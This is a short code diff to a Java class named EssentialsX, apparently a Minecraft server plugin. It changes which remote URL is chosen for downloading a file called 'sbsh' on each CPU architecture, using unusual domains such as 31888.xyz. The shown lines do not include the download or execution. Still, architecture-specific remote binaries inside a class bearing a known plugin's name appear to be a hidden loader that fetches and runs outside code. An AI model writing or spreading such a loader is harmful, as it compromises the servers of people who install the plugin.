@@ -48,7 +48,7 @@ public class EssentialsX extends JavaPlugin {
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
             url = "https://amd64.31888.xyz/sbsh";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.sss.hidns.vip/sbsh";
+            url = "https://amd64.31888.xyz/sbsh";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
